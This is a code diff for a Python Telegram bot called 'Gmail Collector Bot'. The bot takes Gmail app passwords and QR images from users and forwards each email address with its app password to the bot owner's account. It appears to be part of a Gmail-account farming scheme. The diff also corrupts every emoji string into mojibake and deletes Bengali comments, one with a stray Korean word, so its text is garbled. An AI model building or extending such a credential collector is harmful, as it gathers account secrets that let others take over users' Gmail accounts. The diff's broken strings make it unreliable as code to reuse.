@@ -1,6 +1,3 @@
-# তোমার দেওয়া পুরো কোড যেটা তুমি পাঠিয়েছো, সেটা 그대로 থাকবে এখানে।
-# আমি নিচে কোডটি একটু কমেন্টসহ দিলাম। তুমি চাইলে সরাসরি main.py হিসেবে সেভ করবে।
-
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder, CommandHandler, MessageHandler,
@@ -32,7 +29,7 @@ user_map = {}       # user_id -> {"app_pass": "...", ...}
 # === START COMMAND ===
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("👋 Welcome to Gmail Collector Bot!")
+    await update.message.reply_text("ðŸ‘‹ Welcome to Gmail Collector Bot!")
 
 # === PHOTO HANDLER (QR Code) ===
 
@@ -42,7 +39,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     path = f"qr_{user_id}.jpg"
     file = await photo.get_file()
     await file.download_to_drive(path)
-    await update.message.reply_text("✅ QR received. Processing your Gmail request...")
+    await update.message.reply_text("âœ… QR received. Processing your Gmail request...")
     user_map[user_id] = {}  # reset
     if user_id not in pending_users:
         pending_users.append(user_id)
@@ -54,8 +51,8 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text.strip()
 
-    if text == "➕ Register a new Gmail":
-        await context.bot.send_message(chat_id=user_id, text="🔄 Registering new Gmail, please wait...")
+    if text == "âž• Register a new Gmail":
+        await context.bot.send_message(chat_id=user_id, text="ðŸ”„ Registering new Gmail, please wait...")
         user_map[user_id] = {}
         if user_id not in pending_users:
             pending_users.append(user_id)
@@ -64,7 +61,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # App Password format match
     if re.fullmatch(r"([a-z]{4}\s){3}[a-z]{4}", text.lower()):
-        await context.bot.send_message(chat_id=user_id, text="🔐 App Password sent. Please wait...")
+        await context.bot.send_message(chat_id=user_id, text="ðŸ” App Password sent. Please wait...")
         user_map[user_id] = {"app_pass": text}
         if user_id not in pending_users:
             pending_users.append(user_id)
@@ -78,11 +75,11 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     selected_email = query.data
 
-    await query.edit_message_text(f"📧 Selected: {selected_email}", parse_mode="Markdown")
+    await query.edit_message_text(f"ðŸ“§ Selected: {selected_email}", parse_mode="Markdown")
 
     app_pass = user_map.get(user_id, {}).get("app_pass", "")
     if app_pass:
-        msg = f"📩 Gmail: {selected_email}\n🔐 App Password:\n\n`{app_pass}`"
+        msg = f"ðŸ“© Gmail: {selected_email}\nðŸ” App Password:\n\n`{app_pass}`"
         await client.send_message(OWNER_ID, msg, parse_mode="Markdown")
 
 # === GMAIL FARMER REPLY HANDLER ===
@@ -115,7 +112,7 @@ async def forward_reply(event):
 # === MAIN FUNCTION ===
 
 async def main():
-    print("✅ Collector Bot is starting...")
+    print("âœ… Collector Bot is starting...")
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
@@ -125,7 +122,7 @@ async def main():
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
-    print("🤖 Bot is now polling messages...")
+    print("ðŸ¤– Bot is now polling messages...")
 
     await client.start()
     await asyncio.gather(client.run_until_disconnected(), asyncio.Event().wait())
